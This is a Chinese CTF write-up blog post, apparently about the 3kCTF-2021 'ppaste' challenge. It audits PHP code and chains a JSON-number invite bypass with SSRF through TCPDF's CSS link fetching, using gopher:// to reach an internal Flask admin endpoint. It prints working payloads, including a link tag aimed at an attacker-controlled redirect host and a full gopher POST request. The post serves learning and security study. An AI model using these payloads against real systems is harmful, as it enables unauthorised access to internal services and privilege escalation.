+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">var_dump</span>(<span class="title function_">json_decode</span>(<span class="string">&quot;NULL&quot;</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="comment">//NULL</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://oss.hehanzzz.icu/img/202405130149661.png">​</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;register&quot;</span>,<span class="string">&quot;d&quot;</span>:&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hehanzzz&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;hehanzzz123&quot;</span>,<span class="string">&quot;invite&quot;</span>:-<span class="number">3.3e99999999999999</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="TCPDF-探究-及-Gopher协议SSRF打Flask服务"><a href="#TCPDF-探究-及-Gopher协议SSRF打Flask服务" class="headerlink" title="TCPDF 探究 及 Gopher协议SSRF打Flask服务"></a>TCPDF 探究 及 Gopher协议SSRF打Flask服务</h3><p>注册完后，回到主页面进行添加文章，我们可以看到文章详细页有个下载pdf，放入标题时，发现可以成功解析到html标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\s+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>但是这不是漏洞点，别忘记了这个题目的标题叫什么，故需要从download路由下手分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] )&#123;</span><br><span class="line">            <span class="comment">//some useless code....</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]===<span class="string">&#x27;_pdf&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/config/tcpdf_config.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/tcpdf.php&#x27;</span>);</span><br><span class="line">                <span class="variable">$pdf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TCPDF</span>(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, <span class="literal">true</span>, <span class="string">&#x27;UTF-8&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetDefaultMonospacedFont</span>(PDF_FONT_MONOSPACED);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetMargins</span>(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetFont</span>(<span class="string">&#x27;helvetica&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">9</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">AddPage</span>();</span><br><span class="line">                <span class="variable">$html</span> = <span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="variable">$tP</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&#x27;&lt;/h2&gt;&lt;br&gt;&lt;h2&gt;&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">40</span>).<span class="string">&#x27;&lt;/h2&gt;&lt;pre&gt;&#x27;</span>.<span class="title function_ invoke__">htmlentities</span>(<span class="variable">$tP</span>[<span class="string">&#x27;content&#x27;</span>],ENT_QUOTES).<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">writeHTML</span>(<span class="variable">$html</span>, <span class="literal">true</span>, <span class="number">0</span>, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">lastPage</span>();</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">Output</span>(<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因为是跟html解析有关系，所以优先选择跟入writeHTML，<code>writeHTML</code>​类的代码太多了，只把主要的放出来分析</p>
+<p>这里如何定位哪些是我们需要的，很简单，看哪些是我们可控的就好了</p>
+<p>很明显可控的就是 $html ， 所以我们只需要跟进去</p>
+<p>在17272行可以找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeHTML</span>(<span class="params"><span class="variable">$html</span>, <span class="variable">$ln</span>=<span class="literal">true</span>, <span class="variable">$fill</span>=<span class="literal">false</span>, <span class="variable">$reseth</span>=<span class="literal">false</span>, <span class="variable">$cell</span>=<span class="literal">false</span>, <span class="variable">$align</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getHtmlDomArray</span>(<span class="variable">$html</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进 getHtmlDomArray</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该函数用于从HTML内容中提取link标签中type为&quot;text/css&quot;且media为&quot;all&quot;或&quot;print&quot;的CSS属性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $html 要解析的HTML内容。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array 包含从HTML link标签中提取的CSS属性的数组。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtmlDomArray</span>(<span class="params"><span class="variable">$html</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$matches</span> = <span class="keyword">array</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 正则表达式匹配HTML link标签</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&lt;link([^\&gt;]*)&gt;/isU&#x27;</span>, <span class="variable">$html</span>, <span class="variable">$matches</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$link</span>) &#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="keyword">array</span>();</span><br><span class="line">          </span><br><span class="line">            <span class="comment">// 检查link标签是否包含type=&quot;text/css&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/type[\s]*=[\s]*&quot;text\/css&quot;/&#x27;</span>, <span class="variable">$link</span>, <span class="variable">$type</span>)) &#123;</span><br><span class="line">                <span class="variable">$type</span> = <span class="keyword">array</span>();</span><br><span class="line">              </span><br><span class="line">                <span class="comment">// 提取media属性值</span></span><br><span class="line">                <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/media[\s]*=[\s]*&quot;([^&quot;]*)&quot;/&#x27;</span>, <span class="variable">$link</span>, <span class="variable">$type</span>);</span><br><span class="line">              </span><br><span class="line">                <span class="comment">// 仅处理media为&#x27;all&#x27;或&#x27;print&#x27;的情况，丢弃其他media类型</span></span><br><span class="line">                <span class="comment">// （all, braille, embossed, handheld, print, projection, screen, speech, tty, tv）</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$type</span>) <span class="title function_ invoke__">OR</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>[<span class="number">1</span>]) <span class="title function_ invoke__">AND</span> ((<span class="variable">$type</span>[<span class="number">1</span>] == <span class="string">&#x27;all&#x27;</span>) <span class="title function_ invoke__">OR</span> (<span class="variable">$type</span>[<span class="number">1</span>] == <span class="string">&#x27;print&#x27;</span>)))) &#123;</span><br><span class="line">                    <span class="variable">$type</span> = <span class="keyword">array</span>();</span><br><span class="line">                  </span><br><span class="line">                    <span class="comment">// 提取href属性值（CSS文件的URL）</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/href[\s]*=[\s]*&quot;([^&quot;]*)&quot;/&#x27;</span>, <span class="variable">$link</span>, <span class="variable">$type</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="variable">$href</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$type</span>[<span class="number">1</span>]); <span class="comment">// 提取到的CSS文件的URL</span></span><br><span class="line">                      </span><br><span class="line">                        <span class="comment">// 读取CSS数据文件</span></span><br><span class="line">                        <span class="variable">$cssdata</span> = TCPDF_STATIC::<span class="title function_ invoke__">fileGetContents</span>(<span class="variable">$href</span>);</span><br><span class="line">                      </span><br><span class="line">                        <span class="comment">// 如果CSS数据有效且非空，则提取CSS属性</span></span><br><span class="line">                        <span class="keyword">if</span> ((<span class="variable">$cssdata</span> !== <span class="literal">FALSE</span>) <span class="title function_ invoke__">AND</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cssdata</span>) &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">                            <span class="variable">$css</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$css</span>, TCPDF_STATIC::<span class="title function_ invoke__">extractCSSproperties</span>(<span class="variable">$cssdata</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据注释不难发现，匹配HTML link标签时，先匹配页面中所有符合外层正则link的html，检查link标签是否包含type&#x3D;”text&#x2F;css”，处理media为’all’或’print’的情况，丢弃其他media类型，提取href属性值</p>
+<p>然后进入到关键的 TCPDF_STATIC 类下的 fileGetContents 函数中</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130149109.png">​</p>
+<p>根据上图注释，我们也可以直接知道，1961行的 <code>file_exists</code>​ 方法是关键，因为他是后面 curl 的 url</p>
+<p>跟进去看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">file_exists</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;|^https?://|&#x27;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>  <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;|^gopher://|&#x27;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">url_exists</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;://&#x27;</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// only support http and https wrappers for security reasons</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> @<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会进行判断是否使用http或https协议以及 <strong>gopher协议</strong></p>
+<p>（这里就是与原题唯一的改动，至于为什么后续会说，一开始我也没关注到这里）</p>
+<p>如果是上面的协议就进入 url_exists 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">url_exists</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$crs</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">	<span class="comment">// encode query params in URL to get right response form the server</span></span><br><span class="line">	<span class="variable">$url</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">encodeUrlQuery</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_NOBODY, <span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_FAILONERROR, <span class="literal">true</span>);</span><br><span class="line">	<span class="comment">//关键点来啦！！！</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>) == <span class="string">&#x27;&#x27;</span>) &amp;&amp; (!<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;safe_mode&#x27;</span>))) &#123;</span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$crs</span>, CURLOPT_USERAGENT, <span class="string">&#x27;tc-lib-file&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$crs</span>);</span><br><span class="line">	<span class="variable">$code</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$crs</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$crs</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$code</span> == <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>open_basedir==&#39;&#39;</code>​和没有设置<code>safe_mode</code>​，该方法将获取启用重定向的给定 URL</p>
+<p>关键在于这两个点是php默认配置</p>
+<p>所以前面的 gopher协议生效，可以ssrf打内网python服务</p>
+<p>结合以下前面的拿flag条件，可以找到，要提升权限</p>
+<p>因为前面注册用户的时候执行了 priv 为 0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO users(user,pass,priv) VALUES (&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>得去设置为1，即为提权为admin，即为触发python服务下的<code>/users</code>​</p>
+<p>仅通过正则表达式执行糟糕的协议，启用了重定向，可能会使用 GOPHER，因此我们可以与任何 protcol 进行原始 tcp 对话</p>
+<p>根据 &#x2F;users 路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        myJson = json.loads(request.data)</span><br><span class="line">        <span class="keyword">if</span>(myJson[<span class="string">&#x27;user&#x27;</span>]):</span><br><span class="line">            qDB(<span class="string">&quot;UPDATE users SET priv=not(priv) WHERE user=? &quot;</span>,<span class="string">&quot;setAdmin&quot;</span>,myJson[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> json.dumps(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(qDB(<span class="string">&quot;SELECT user,priv FROM users&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>只需要传入一个存在user键的json串即可，即：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;USERMANE&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以payload为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;linktype=<span class="string">&quot;text/css&quot;</span>href=<span class="string">&quot;http://[%YOUR_HOST%]/redirect&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在vps下设置gopher 的重定向，对内部 API 执行 POST 请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location: gopher://localhost:8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2024%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22USERNAME%22%7D</span><br></pre></td></tr></table></figure>
+
+<p>然后请求</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /api.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: *</span><br><span class="line">Content-Length: <span class="number">18</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<p>但是&#x3D;.&#x3D;</p>
+<p>这台机器不出网，不能这么打</p>
+<h4 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h4><p>前面有提到过，这题与原题多了一个 <code>gopher</code>​ 协议的正则匹配</p>
+<p>所以，我们可以直接利用 <code>gopher</code>​ 协议去打，不需要vps去配合跳转（所以它算是魔改了TCPDF组件来满足我们获取flag的条件）</p>
+<p>故payload为：（需要注意的是，这里的user是另一个用户的，并未发送请求包的这个用户）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;new&quot;</span>,<span class="string">&quot;d&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;&lt;linktype=\&quot;text/css\&quot;href=\&quot;gopher://localhost:8082/_POST%20/users%20HTTP/1.1%0D%0AHost%3A%20localhost%0D%0AContent-Length%3A%2018%0D%0AContent-type%3A%20application/json%0D%0A%0D%0A%7B%22user%22%3A%22hhhm123%22%7D%0D%0A\&quot;&gt;&quot;</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;123123123123123123123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://oss.hehanzzz.icu/img/202405130149339.png">​</p>
+<p>然后再去请求，得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://oss.hehanzzz.icu/img/202405130148565.png">​</p>
+<p>这里的ok就是flag</p>
+<h1 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2069757">3kCTF2021-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://b6a.black/posts/2021-05-22-3kctf/#ppaste-web-498-points">3kCTF-2021 报道 |黑紫荆 (b6a.black)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://r0.haxors.org/posts?id=15">r0 |3kCTF-2021 - 粘贴写法 (haxors.org)</a></p>
+</li>
+</ul>
+<p>‍</p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+        </span>
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/PHP/">PHP</a>
+        </span>
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/CTF/">CTF</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+    </div>
+    <div>
+      
+        <a href="/2024/05/10/%E2%80%9C%E5%B0%8F%E6%9C%88%E4%BA%91%E5%8C%BF%E5%90%8D%E7%9F%AD%E4%BF%A1%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81V2-0%E2%80%9D%E5%AE%A1%E8%AE%A1/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          “小月云匿名短信系统源码V2.0”审计
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+<script
+  src="https://giscus.app/client.js"
+  data-repo="Hehanzzz/hehanzzz.github.io"
+  data-repo-id="R_kgDOKls9Wg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOKls9Ws4Cb8Mv"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async
+></script>
+<script>
+  window.onload = function () {
+    console.log("giscus loaded");
+    const isDark = document.documentElement.classList.contains("dark");
+    const giscusFrame = document.querySelector("iframe.giscus-frame");
+    giscusFrame.contentWindow.postMessage(
+      {
+        giscus: {
+          setConfig: {
+            theme: isDark ? "dark" : "light",
+          },
+        },
+      },
+      "https://giscus.app"
+    );
+  };
+</script>
+
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
